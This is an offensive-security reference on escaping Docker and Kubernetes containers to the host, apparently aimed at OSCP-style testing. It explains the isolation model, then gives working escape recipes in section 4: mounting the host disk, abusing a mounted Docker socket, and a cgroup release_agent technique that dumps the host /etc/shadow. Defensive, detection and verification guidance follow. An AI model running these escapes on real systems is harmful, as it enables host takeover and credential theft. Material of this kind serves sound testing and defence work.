# Container Escape Techniques

This file covers escape techniques from containerized environments to the host. Unlike virtual machines, containers share the host kernel and are isolated by namespaces, cgroups, and security modules (AppArmor, SELinux, seccomp). A container escape often exploits a misconfiguration (privileged container, mounted host paths) or a kernel vulnerability.

## 1. Overview

Containers (Docker, containerd, Podman, Kubernetes pods) are processes on the host, isolated by Linux kernel features. The isolation boundary is the kernel itself. Escaping a container means breaking out of these kernel-enforced restrictions to access the host filesystem, host processes, or host network.

Common escape vectors include:

- Privileged containers (`--privileged` flag).
- Mounted host paths (`/var/run/docker.sock`, `/proc`, `/sys`).
- Kernel vulnerabilities (e.g., `dirty pipe`, `overlayfs` bugs).
- Misconfigured capabilities (`CAP_SYS_ADMIN`).
- Weak seccomp/AppArmor profiles.

## 2. Container Isolation Model

Containers rely on the following kernel features:

- **Namespaces** - isolate PID, network, mount, IPC, UTS, user, and cgroup views.
- **cgroups** - limit resource usage (CPU, memory, I/O).
- **Capabilities** - restrict privileged operations (e.g., `CAP_SYS_ADMIN` is dangerous).
- **seccomp** - filter system calls.
- **LSM (AppArmor/SELinux)** - mandatory access control.

A container escape occurs when one of these layers fails or is misconfigured.

## 3. Common Attack Vectors

### 3.1 Privileged Container

A container started with `--privileged` has all capabilities and access to all devices. An attacker inside such a container can:

- Mount the host filesystem (`mount /dev/sda1 /mnt`).
- Access host devices (`/dev/mem`, `/dev/kmsg`).
- Escape via `nsenter` or `chroot` to the host.

### 3.2 Mounted Docker Socket

If `/var/run/docker.sock` is mounted inside the container, the attacker can use the Docker API to create a new privileged container that mounts the host filesystem.

### 3.3 Host Path Mounts

A mount like `-v /:/host` exposes the host filesystem. The attacker can read/write host files, modify `/etc/passwd`, or add SSH keys.

### 3.4 CAP_SYS_ADMIN

This capability allows mounting filesystems, using `pivot_root`, and other privileged operations. A container with `CAP_SYS_ADMIN` can often escape by mounting a `cgroup` or `proc` filesystem.

### 3.5 Kernel Exploits

Kernel vulnerabilities (e.g., CVE-2022-0847 "Dirty Pipe", CVE-2021-3493 overlayfs) can be triggered from inside a container to escalate to root on the host.

## 4. Exploitation Recipes

### 4.1 Escaping a Privileged Container

```bash
# Inside a privileged container, mount the host disk.
$ mkdir /mnt/host
$ mount /dev/sda1 /mnt/host
$ chroot /mnt/host /bin/bash
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Expected output:

```text
# (no output - you are now in a root shell on the host filesystem)
```

### 4.2 Escaping via Docker Socket

```bash
# Inside a container with the Docker socket mounted.
$ docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Expected output:

```text
# (no output - you are now in a chroot of the host filesystem)
```

### 4.3 Escaping via CAP_SYS_ADMIN

```bash
# Inside a container with CAP_SYS_ADMIN, use cgroup release_agent.
$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
$ echo 1 > /tmp/cgrp/x/notify_on_release
$ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
$ echo "$host_path/cmd" > /tmp/cgrp/release_agent
$ echo '#!/bin/sh' > /cmd
$ echo "cat /etc/shadow > $host_path/output" >> /cmd
$ chmod a+x /cmd
$ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Expected output:

```text
# (no output - the host /etc/shadow is written to the output file)
```

## 5. Post-Exploitation

Once on the host, the attacker can:

- Access other containers' filesystems.
- Read host secrets (SSH keys, cloud credentials).
- Pivot to the internal network.
- Install persistence (systemd service, cron job).

## 6. Defensive Controls

- **Never use `--privileged`** unless absolutely necessary.
- **Do not mount the Docker socket** into containers.
- **Use read-only mounts** for host paths.
- **Drop all capabilities** and add only the required ones (`--cap-drop=ALL --cap-add=NET_BIND_SERVICE`).
- **Enforce seccomp and AppArmor/SELinux profiles.**
- **Keep the host kernel patched.**

## 7. Detection Controls

- **Audit container configurations** for privileged mode, host mounts, and dangerous capabilities.
- **Monitor `mount`, `chroot`, and `nsenter` syscalls** from containers.
- **Use Falco or similar runtime security tools** to detect escape attempts.
- **Kubernetes Pod Security Standards** (Restricted profile) to prevent privileged pods.

## 8. Verification

To verify isolation:

- Run a container without `--privileged` and attempt `mount`; it should fail with "permission denied".
- Check that the Docker socket is not mounted: `ls /var/run/docker.sock`.
- Verify capabilities: `capsh --print`.

## 9. Production Notes

- In Kubernetes, use Pod Security Admission (PSA) to enforce the Restricted profile.
- Regularly scan container images for vulnerabilities and misconfigurations.
- Assume a container escape is possible and segment the host network accordingly.

## 10. References

- Docker Security Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
- NIST SP 800-190 Application Container Security Guide - https://csrc.nist.gov/publications/detail/sp/800-190/final
- CVE-2022-0847 (Dirty Pipe) - https://nvd.nist.gov/vuln/detail/CVE-2022-0847
- CVE-2021-3493 (overlayfs privilege escalation) - https://nvd.nist.gov/vuln/detail/CVE-2021-3493
- Kubernetes Pod Security Standards - https://kubernetes.io/docs/concepts/security/pod-security-standards/
- Falco runtime security - https://falco.org/